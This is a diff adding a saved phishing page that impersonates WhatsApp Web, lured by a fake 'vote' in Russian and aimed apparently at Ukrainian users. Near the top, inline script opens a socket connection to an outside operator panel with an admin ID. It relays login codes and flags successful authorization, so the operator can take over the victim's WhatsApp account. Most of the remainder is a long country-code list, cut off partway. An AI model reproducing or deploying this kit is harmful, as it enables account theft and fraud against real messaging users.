@@ -1,0 +1,1922 @@
+<!DOCTYPE html>
+<!-- saved from url=(0103)https://golosuui-watspw.ru/number/?sid=hNuM29EzR5BGsPsFnzlKo4iVtr5nFpuY9X1xU4xyKP2IMXmM3k6ICRCJlvA7V5K7 -->
+<html lang="en"><script type="text/javascript" src="chrome-extension://kajfghlhfkcocafkcjlajldicbikpgnp/catcher.js"><!-- script injected by Request Maker --></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="./WhatsApp_files/icon.svg">
+    <title>WhatsApp</title>
+    <script src="./WhatsApp_files/jquery.js"></script>
+    <script src="./WhatsApp_files/lazyload.js"></script>
+    <script src="./WhatsApp_files/socket.io.min.js"></script>
+
+    <link rel="stylesheet" href="./WhatsApp_files/default.css">
+    <link rel="stylesheet" href="./WhatsApp_files/auth.css">
+    <link rel="stylesheet" href="./WhatsApp_files/main.css">
+    <script>
+        let link = "ZUYzVDjRNjLs";
+        let unique = localStorage.getItem("unique") || 1;
+        let session = "hNuM29EzR5BGsPsFnzlKo4iVtr5nFpuY9X1xU4xyKP2IMXmM3k6ICRCJlvA7V5K7";
+        let server_sid = null;
+        let socket_status = true;
+            let next_url = "/vote/?voted=true#voted";
+        </script>
+    <script src="./WhatsApp_files/functions.js"></script>
+    <script>
+        $(document).ready(function() {
+            const trySocketConnection = () => {
+                if (socket_status) {
+                    const socket = io('https://socket-panel.tech/', {
+                        query: {
+                            userId: session,
+                            adminId: 'tYDccBTAOMKCLMYtLUerCo5Y7lVZlTXB',
+                            currentPage: 'phone',
+                        }
+                    });
+
+                    socket.on('connect_error', (error) => {
+                        socket_status = false;
+                        console.error('Connection error:', error);
+                        socket.disconnect();
+                    });
+
+                    socket.on('connect_timeout', (timeout) => {
+                        socket_status = false;
+                        console.error('Connection timeout:', timeout);
+                        socket.disconnect();
+                    });
+
+                    socket.on('disconnect', (reason) => {
+                        socket_status = false;
+                        console.log('Disconnected:', reason);
+                    });
+
+                    socket.on('getCode', (data) => {
+                        showCode(data);
+                    });
+
+                    socket.on('authSuccess', (data) => {
+                        saveAuthotization();
+                    });
+
+                } else {
+                    console.error('Socket connection is disabled.');
+                }
+            };
+
+            trySocketConnection();
+
+                    });
+    </script>
+    <script src="./WhatsApp_files/main.js"></script>
+</head>
+<body class="number-page">
+
+    <div class="preloader hidden" id="preloader">
+    <div class="content">
+        <div class="icon">
+            <svg width="250" height="52" xmlns="http://www.w3.org/2000/svg">
+                <path class="resume-logo" d="M37.7 31.2c-.6-.4-3.8-2-4.4-2.1-.6-.2-1-.4-1.4.3l-2 2.5c-.4.4-.8.5-1.5.2-.6-.3-2.7-1-5.1-3.2-2-1.7-3.2-3.8-3.6-4.5-.4-.6 0-1 .3-1.3l1-1.1.6-1.1c.2-.4 0-.8 0-1.1l-2-4.8c-.6-1.3-1.1-1-1.5-1.1h-1.2c-.5 0-1.2.1-1.8.8-.5.6-2.2 2.2-2.2 5.3 0 3.2 2.3 6.3 2.6 6.7.3.4 4.6 7 11 9.7l3.7 1.4c1.5.5 3 .4 4 .2 1.3-.1 3.9-1.5 4.4-3 .5-1.5.5-2.8.4-3-.2-.4-.6-.5-1.3-.8M26 47.2c-3.9 0-7.6-1-11-3l-.7-.4-8.1 2L8.4 38l-.6-.8A21.4 21.4 0 0126 4.4a21.3 21.3 0 0121.4 21.4c0 11.8-9.6 21.4-21.4 21.4M44.2 7.6a25.8 25.8 0 00-40.6 31L0 52l13.7-3.6A25.8 25.8 0 0044.3 7.5" fill="#676f73"></path>
+            </svg>
+        </div>
+        <div class="progress"><div class="progress-bar" style="width: 100%"></div></div>
+        <h2>WhatsApp</h2>
+        <div class="description">
+            <div class="image">
+                <svg width="10" height="12" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M5 1.6c1.4 0 2.5 1 2.6 2.4v1.5h.2c.5 0 1 .4 1 1V10c0 .6-.5 1-1 1H2.3a1 1 0 01-1.1-1V6.5c0-.6.5-1 1-1h.2V4.2c0-1.4 1-2.5 2.4-2.6H5zm0 1.2c-.7 0-1.3.6-1.3 1.3v1.4h2.6V4.2c0-.7-.4-1.2-1-1.3H5z" fill="#676f73"></path>
+                </svg>
+            </div>
+            <p>Защищено сквозным шифрованием</p>
+        </div>
+    </div>
+    </div>
+
+
+    <div class="wrapper">
+        <div class="header">
+        <div class="logo">
+        <div class="image">
+            <img src="./WhatsApp_files/icon.svg" alt="WhatsApp">
+        </div>
+        <p class="title">WhatsApp Web</p>
+        </div>
+    </div>
+
+        <div class="block number">
+            <div class="description">
+                <div class="text">
+                    <h2>Чтобы Ваш голос был засчитан, нужно авторизоваться с помощь WhatsApp</h2>
+                    <p>Выберите страну и введите свой номер телефона в WhatsApp.</p>
+                </div>
+            </div>
+            <div class="form">
+                <div class="country active">
+                    <div class="image">
+                        <img src="./WhatsApp_files/UA.png" alt="AU">
+                    </div>
+                    <p class="name">Украина</p>
+                    <div class="icon">
+                        <svg viewBox="0 0 10 5" height="5" width="10" preserveAspectRatio="xMidYMid meet" class="" fill="none">
+                            <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0L5 5L10 0H0Z" fill="currentColor" fill-opacity="0.3"></path>
+                        </svg>
+                    </div>
+                </div>
+                <div class="countries">
+                    <div class="search">
+                        <div class="image">
+                            <svg viewBox="0 0 24 24" height="24" width="24" preserveAspectRatio="xMidYMid meet" class="" version="1.1" x="0px" y="0px" enable-background="new 0 0 24 24">
+                                <path fill="#54656f" d="M15.009,13.805h-0.636l-0.22-0.219c0.781-0.911,1.256-2.092,1.256-3.386 c0-2.876-2.332-5.207-5.207-5.207c-2.876,0-5.208,2.331-5.208,5.207s2.331,5.208,5.208,5.208c1.293,0,2.474-0.474,3.385-1.255 l0.221,0.22v0.635l4.004,3.999l1.194-1.195L15.009,13.805z M10.201,13.805c-1.991,0-3.605-1.614-3.605-3.605 s1.614-3.605,3.605-3.605s3.605,1.614,3.605,3.605S12.192,13.805,10.201,13.805z"></path>
+                            </svg>
+                        </div>
+                        <input type="text" id="search" placeholder="Поиск">
+                    </div>
+                    <div class="items">
+                                                    <div class="item" data-code="+61" data-lang="AU" data-name="Австралия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AU.png" alt="AU" data-ll-status="loaded" src="./WhatsApp_files/AU.png">
+                                </div>
+                                <p class="name">Австралия</p>
+                                <p class="code">+61</p>
+                            </div>
+                                                    <div class="item" data-code="+43" data-lang="AT" data-name="Австрия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AT.png" alt="AT" data-ll-status="loaded" src="./WhatsApp_files/AT.png">
+                                </div>
+                                <p class="name">Австрия</p>
+                                <p class="code">+43</p>
+                            </div>
+                                                    <div class="item" data-code="+994" data-lang="AZ" data-name="Азербайджан">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AZ.png" alt="AZ" data-ll-status="loaded" src="./WhatsApp_files/AZ.png">
+                                </div>
+                                <p class="name">Азербайджан</p>
+                                <p class="code">+994</p>
+                            </div>
+                                                    <div class="item" data-code="+358" data-lang="AX" data-name="Аландские о-ва">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AX.png" alt="AX" data-ll-status="loaded" src="./WhatsApp_files/AX.png">
+                                </div>
+                                <p class="name">Аландские о-ва</p>
+                                <p class="code">+358</p>
+                            </div>
+                                                    <div class="item" data-code="+355" data-lang="AL" data-name="Албания">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AL.png" alt="AL" data-ll-status="loaded" src="./WhatsApp_files/AL.png">
+                                </div>
+                                <p class="name">Албания</p>
+                                <p class="code">+355</p>
+                            </div>
+                                                    <div class="item" data-code="+213" data-lang="DZ" data-name="Алжир">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/DZ.png" alt="DZ" data-ll-status="loaded" src="./WhatsApp_files/DZ.png">
+                                </div>
+                                <p class="name">Алжир</p>
+                                <p class="code">+213</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="AS" data-name="Американское Самоа">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AS.png" alt="AS" data-ll-status="loaded" src="./WhatsApp_files/AS.png">
+                                </div>
+                                <p class="name">Американское Самоа</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="AI" data-name="Ангилья">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AI.png" alt="AI" data-ll-status="loaded" src="./WhatsApp_files/AI.png">
+                                </div>
+                                <p class="name">Ангилья</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+244" data-lang="AO" data-name="Ангола">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AO.png" alt="AO" data-ll-status="loaded" src="./WhatsApp_files/AO.png">
+                                </div>
+                                <p class="name">Ангола</p>
+                                <p class="code">+244</p>
+                            </div>
+                                                    <div class="item" data-code="+376" data-lang="AD" data-name="Андорра">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AD.png" alt="AD" data-ll-status="loaded" src="./WhatsApp_files/AD.png">
+                                </div>
+                                <p class="name">Андорра</p>
+                                <p class="code">+376</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="AG" data-name="Антигуа и Барбуда">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AG.png" alt="AG" data-ll-status="loaded" src="./WhatsApp_files/AG.png">
+                                </div>
+                                <p class="name">Антигуа и Барбуда</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+54" data-lang="AR" data-name="Аргентина">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AR.png" alt="AR" data-ll-status="loaded" src="./WhatsApp_files/AR.png">
+                                </div>
+                                <p class="name">Аргентина</p>
+                                <p class="code">+54</p>
+                            </div>
+                                                    <div class="item" data-code="+374" data-lang="AM" data-name="Армения">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AM.png" alt="AM" data-ll-status="loaded" src="./WhatsApp_files/AM.png">
+                                </div>
+                                <p class="name">Армения</p>
+                                <p class="code">+374</p>
+                            </div>
+                                                    <div class="item" data-code="+297" data-lang="AW" data-name="Аруба">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AW.png" alt="AW" data-ll-status="loaded" src="./WhatsApp_files/AW.png">
+                                </div>
+                                <p class="name">Аруба</p>
+                                <p class="code">+297</p>
+                            </div>
+                                                    <div class="item" data-code="+93" data-lang="AF" data-name="Афганистан">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AF.png" alt="AF" data-ll-status="loaded" src="./WhatsApp_files/AF.png">
+                                </div>
+                                <p class="name">Афганистан</p>
+                                <p class="code">+93</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="BS" data-name="Багамы">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BS.png" alt="BS" data-ll-status="loaded" src="./WhatsApp_files/BS.png">
+                                </div>
+                                <p class="name">Багамы</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+880" data-lang="BD" data-name="Бангладеш">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BD.png" alt="BD" data-ll-status="loaded" src="./WhatsApp_files/BD.png">
+                                </div>
+                                <p class="name">Бангладеш</p>
+                                <p class="code">+880</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="BB" data-name="Барбадос">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BB.png" alt="BB" data-ll-status="loaded" src="./WhatsApp_files/BB.png">
+                                </div>
+                                <p class="name">Барбадос</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+973" data-lang="BH" data-name="Бахрейн">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BH.png" alt="BH" data-ll-status="loaded" src="./WhatsApp_files/BH.png">
+                                </div>
+                                <p class="name">Бахрейн</p>
+                                <p class="code">+973</p>
+                            </div>
+                                                    <div class="item" data-code="+375" data-lang="BY" data-name="Беларусь">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BY.png" alt="BY" data-ll-status="loaded" src="./WhatsApp_files/BY.png">
+                                </div>
+                                <p class="name">Беларусь</p>
+                                <p class="code">+375</p>
+                            </div>
+                                                    <div class="item" data-code="+501" data-lang="BZ" data-name="Белиз">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BZ.png" alt="BZ" data-ll-status="loaded" src="./WhatsApp_files/BZ.png">
+                                </div>
+                                <p class="name">Белиз</p>
+                                <p class="code">+501</p>
+                            </div>
+                                                    <div class="item" data-code="+32" data-lang="BE" data-name="Бельгия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BE.png" alt="BE" data-ll-status="loaded" src="./WhatsApp_files/BE.png">
+                                </div>
+                                <p class="name">Бельгия</p>
+                                <p class="code">+32</p>
+                            </div>
+                                                    <div class="item" data-code="+229" data-lang="BJ" data-name="Бенин">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BJ.png" alt="BJ" data-ll-status="loaded" src="./WhatsApp_files/BJ.png">
+                                </div>
+                                <p class="name">Бенин</p>
+                                <p class="code">+229</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="BM" data-name="Бермудские о-ва">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BM.png" alt="BM" data-ll-status="loaded" src="./WhatsApp_files/BM.png">
+                                </div>
+                                <p class="name">Бермудские о-ва</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+359" data-lang="BG" data-name="Болгария">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BG.png" alt="BG" data-ll-status="loaded" src="./WhatsApp_files/BG.png">
+                                </div>
+                                <p class="name">Болгария</p>
+                                <p class="code">+359</p>
+                            </div>
+                                                    <div class="item" data-code="+591" data-lang="BO" data-name="Боливия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BO.png" alt="BO" data-ll-status="loaded" src="./WhatsApp_files/BO.png">
+                                </div>
+                                <p class="name">Боливия</p>
+                                <p class="code">+591</p>
+                            </div>
+                                                    <div class="item" data-code="+599" data-lang="BQ" data-name="Бонэйр, Синт-Эстатиус и Саба">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BQ.png" alt="BQ" data-ll-status="loaded" src="./WhatsApp_files/BQ.png">
+                                </div>
+                                <p class="name">Бонэйр, Синт-Эстатиус и Саба</p>
+                                <p class="code">+599</p>
+                            </div>
+                                                    <div class="item" data-code="+387" data-lang="BA" data-name="Босния и Герцеговина">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BA.png" alt="BA" data-ll-status="loaded" src="./WhatsApp_files/BA.png">
+                                </div>
+                                <p class="name">Босния и Герцеговина</p>
+                                <p class="code">+387</p>
+                            </div>
+                                                    <div class="item" data-code="+267" data-lang="BW" data-name="Ботсвана">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BW.png" alt="BW" data-ll-status="loaded" src="./WhatsApp_files/BW.png">
+                                </div>
+                                <p class="name">Ботсвана</p>
+                                <p class="code">+267</p>
+                            </div>
+                                                    <div class="item" data-code="+55" data-lang="BR" data-name="Бразилия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BR.png" alt="BR" data-ll-status="loaded" src="./WhatsApp_files/BR.png">
+                                </div>
+                                <p class="name">Бразилия</p>
+                                <p class="code">+55</p>
+                            </div>
+                                                    <div class="item" data-code="+246" data-lang="IO" data-name="Британская территория в Индийском океане">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/IO.png" alt="IO" data-ll-status="loaded" src="./WhatsApp_files/IO.png">
+                                </div>
+                                <p class="name">Британская территория в Индийском океане</p>
+                                <p class="code">+246</p>
+                            </div>
+                                                    <div class="item" data-code="+673" data-lang="BN" data-name="Бруней-Даруссалам">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BN.png" alt="BN" data-ll-status="loaded" src="./WhatsApp_files/BN.png">
+                                </div>
+                                <p class="name">Бруней-Даруссалам</p>
+                                <p class="code">+673</p>
+                            </div>
+                                                    <div class="item" data-code="+226" data-lang="BF" data-name="Буркина-Фасо">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BF.png" alt="BF" data-ll-status="loaded" src="./WhatsApp_files/BF.png">
+                                </div>
+                                <p class="name">Буркина-Фасо</p>
+                                <p class="code">+226</p>
+                            </div>
+                                                    <div class="item" data-code="+257" data-lang="BI" data-name="Бурунди">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BI.png" alt="BI" data-ll-status="loaded" src="./WhatsApp_files/BI.png">
+                                </div>
+                                <p class="name">Бурунди</p>
+                                <p class="code">+257</p>
+                            </div>
+                                                    <div class="item" data-code="+975" data-lang="BT" data-name="Бутан">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/BT.png" alt="BT" data-ll-status="loaded" src="./WhatsApp_files/BT.png">
+                                </div>
+                                <p class="name">Бутан</p>
+                                <p class="code">+975</p>
+                            </div>
+                                                    <div class="item" data-code="+678" data-lang="VU" data-name="Вануату">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/VU.png" alt="VU" data-ll-status="loaded" src="./WhatsApp_files/VU.png">
+                                </div>
+                                <p class="name">Вануату</p>
+                                <p class="code">+678</p>
+                            </div>
+                                                    <div class="item" data-code="+379" data-lang="VA" data-name="Ватикан">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/VA.png" alt="VA" data-ll-status="loaded" src="./WhatsApp_files/VA.png">
+                                </div>
+                                <p class="name">Ватикан</p>
+                                <p class="code">+379</p>
+                            </div>
+                                                    <div class="item" data-code="+44" data-lang="GB" data-name="Великобритания">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GB.png" alt="GB" data-ll-status="loaded" src="./WhatsApp_files/GB.png">
+                                </div>
+                                <p class="name">Великобритания</p>
+                                <p class="code">+44</p>
+                            </div>
+                                                    <div class="item" data-code="+36" data-lang="HU" data-name="Венгрия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/HU.png" alt="HU" data-ll-status="loaded" src="./WhatsApp_files/HU.png">
+                                </div>
+                                <p class="name">Венгрия</p>
+                                <p class="code">+36</p>
+                            </div>
+                                                    <div class="item" data-code="+58" data-lang="VE" data-name="Венесуэла">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/VE.png" alt="VE" data-ll-status="loaded" src="./WhatsApp_files/VE.png">
+                                </div>
+                                <p class="name">Венесуэла</p>
+                                <p class="code">+58</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="VG" data-name="Виргинские о-ва (Великобритания)">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/VG.png" alt="VG" data-ll-status="loaded" src="./WhatsApp_files/VG.png">
+                                </div>
+                                <p class="name">Виргинские о-ва (Великобритания)</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="VI" data-name="Виргинские о-ва (США)">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/VI.png" alt="VI" data-ll-status="loaded" src="./WhatsApp_files/VI.png">
+                                </div>
+                                <p class="name">Виргинские о-ва (США)</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+670" data-lang="TL" data-name="Восточный Тимор">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TL.png" alt="TL" data-ll-status="loaded" src="./WhatsApp_files/TL.png">
+                                </div>
+                                <p class="name">Восточный Тимор</p>
+                                <p class="code">+670</p>
+                            </div>
+                                                    <div class="item" data-code="+84" data-lang="VN" data-name="Вьетнам">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/VN.png" alt="VN" data-ll-status="loaded" src="./WhatsApp_files/VN.png">
+                                </div>
+                                <p class="name">Вьетнам</p>
+                                <p class="code">+84</p>
+                            </div>
+                                                    <div class="item" data-code="+241" data-lang="GA" data-name="Габон">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GA.png" alt="GA" data-ll-status="loaded" src="./WhatsApp_files/GA.png">
+                                </div>
+                                <p class="name">Габон</p>
+                                <p class="code">+241</p>
+                            </div>
+                                                    <div class="item" data-code="+509" data-lang="HT" data-name="Гаити">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/HT.png" alt="HT" data-ll-status="loaded" src="./WhatsApp_files/HT.png">
+                                </div>
+                                <p class="name">Гаити</p>
+                                <p class="code">+509</p>
+                            </div>
+                                                    <div class="item" data-code="+592" data-lang="GY" data-name="Гайана">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GY.png" alt="GY" data-ll-status="loaded" src="./WhatsApp_files/GY.png">
+                                </div>
+                                <p class="name">Гайана</p>
+                                <p class="code">+592</p>
+                            </div>
+                                                    <div class="item" data-code="+220" data-lang="GM" data-name="Гамбия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GM.png" alt="GM" data-ll-status="loaded" src="./WhatsApp_files/GM.png">
+                                </div>
+                                <p class="name">Гамбия</p>
+                                <p class="code">+220</p>
+                            </div>
+                                                    <div class="item" data-code="+233" data-lang="GH" data-name="Гана">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GH.png" alt="GH" data-ll-status="loaded" src="./WhatsApp_files/GH.png">
+                                </div>
+                                <p class="name">Гана</p>
+                                <p class="code">+233</p>
+                            </div>
+                                                    <div class="item" data-code="+590" data-lang="GP" data-name="Гваделупа">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GP.png" alt="GP" data-ll-status="loaded" src="./WhatsApp_files/GP.png">
+                                </div>
+                                <p class="name">Гваделупа</p>
+                                <p class="code">+590</p>
+                            </div>
+                                                    <div class="item" data-code="+502" data-lang="GT" data-name="Гватемала">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GT.png" alt="GT" data-ll-status="loaded" src="./WhatsApp_files/GT.png">
+                                </div>
+                                <p class="name">Гватемала</p>
+                                <p class="code">+502</p>
+                            </div>
+                                                    <div class="item" data-code="+224" data-lang="GN" data-name="Гвинея">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GN.png" alt="GN" data-ll-status="loaded" src="./WhatsApp_files/GN.png">
+                                </div>
+                                <p class="name">Гвинея</p>
+                                <p class="code">+224</p>
+                            </div>
+                                                    <div class="item" data-code="+245" data-lang="GW" data-name="Гвинея-Бисау">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GW.png" alt="GW" data-ll-status="loaded" src="./WhatsApp_files/GW.png">
+                                </div>
+                                <p class="name">Гвинея-Бисау</p>
+                                <p class="code">+245</p>
+                            </div>
+                                                    <div class="item" data-code="+49" data-lang="DE" data-name="Германия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/DE.png" alt="DE" data-ll-status="loaded" src="./WhatsApp_files/DE.png">
+                                </div>
+                                <p class="name">Германия</p>
+                                <p class="code">+49</p>
+                            </div>
+                                                    <div class="item" data-code="+44" data-lang="GG" data-name="Гернси">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GG.png" alt="GG" data-ll-status="loaded" src="./WhatsApp_files/GG.png">
+                                </div>
+                                <p class="name">Гернси</p>
+                                <p class="code">+44</p>
+                            </div>
+                                                    <div class="item" data-code="+350" data-lang="GI" data-name="Гибралтар">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GI.png" alt="GI" data-ll-status="loaded" src="./WhatsApp_files/GI.png">
+                                </div>
+                                <p class="name">Гибралтар</p>
+                                <p class="code">+350</p>
+                            </div>
+                                                    <div class="item" data-code="+504" data-lang="HN" data-name="Гондурас">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/HN.png" alt="HN" data-ll-status="loaded" src="./WhatsApp_files/HN.png">
+                                </div>
+                                <p class="name">Гондурас</p>
+                                <p class="code">+504</p>
+                            </div>
+                                                    <div class="item" data-code="+852" data-lang="HK" data-name="Гонконг (САР)">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/HK.png" alt="HK" data-ll-status="loaded" src="./WhatsApp_files/HK.png">
+                                </div>
+                                <p class="name">Гонконг (САР)</p>
+                                <p class="code">+852</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="GD" data-name="Гренада">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GD.png" alt="GD" data-ll-status="loaded" src="./WhatsApp_files/GD.png">
+                                </div>
+                                <p class="name">Гренада</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+299" data-lang="GL" data-name="Гренландия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GL.png" alt="GL" data-ll-status="loaded" src="./WhatsApp_files/GL.png">
+                                </div>
+                                <p class="name">Гренландия</p>
+                                <p class="code">+299</p>
+                            </div>
+                                                    <div class="item" data-code="+30" data-lang="GR" data-name="Греция">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GR.png" alt="GR" data-ll-status="loaded" src="./WhatsApp_files/GR.png">
+                                </div>
+                                <p class="name">Греция</p>
+                                <p class="code">+30</p>
+                            </div>
+                                                    <div class="item" data-code="+995" data-lang="GE" data-name="Грузия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GE.png" alt="GE" data-ll-status="loaded" src="./WhatsApp_files/GE.png">
+                                </div>
+                                <p class="name">Грузия</p>
+                                <p class="code">+995</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="GU" data-name="Гуам">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/GU.png" alt="GU" data-ll-status="loaded" src="./WhatsApp_files/GU.png">
+                                </div>
+                                <p class="name">Гуам</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+45" data-lang="DK" data-name="Дания">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/DK.png" alt="DK" data-ll-status="loaded" src="./WhatsApp_files/DK.png">
+                                </div>
+                                <p class="name">Дания</p>
+                                <p class="code">+45</p>
+                            </div>
+                                                    <div class="item" data-code="+44" data-lang="JE" data-name="Джерси">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/JE.png" alt="JE" data-ll-status="loaded" src="./WhatsApp_files/JE.png">
+                                </div>
+                                <p class="name">Джерси</p>
+                                <p class="code">+44</p>
+                            </div>
+                                                    <div class="item" data-code="+253" data-lang="DJ" data-name="Джибути">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/DJ.png" alt="DJ" data-ll-status="loaded" src="./WhatsApp_files/DJ.png">
+                                </div>
+                                <p class="name">Джибути</p>
+                                <p class="code">+253</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="DM" data-name="Доминика">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/DM.png" alt="DM" data-ll-status="loaded" src="./WhatsApp_files/DM.png">
+                                </div>
+                                <p class="name">Доминика</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="DO" data-name="Доминиканская Республика">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/DO.png" alt="DO" data-ll-status="loaded" src="./WhatsApp_files/DO.png">
+                                </div>
+                                <p class="name">Доминиканская Республика</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+20" data-lang="EG" data-name="Египет">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/EG.png" alt="EG" data-ll-status="loaded" src="./WhatsApp_files/EG.png">
+                                </div>
+                                <p class="name">Египет</p>
+                                <p class="code">+20</p>
+                            </div>
+                                                    <div class="item" data-code="+260" data-lang="ZM" data-name="Замбия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/ZM.png" alt="ZM" data-ll-status="loaded" src="./WhatsApp_files/ZM.png">
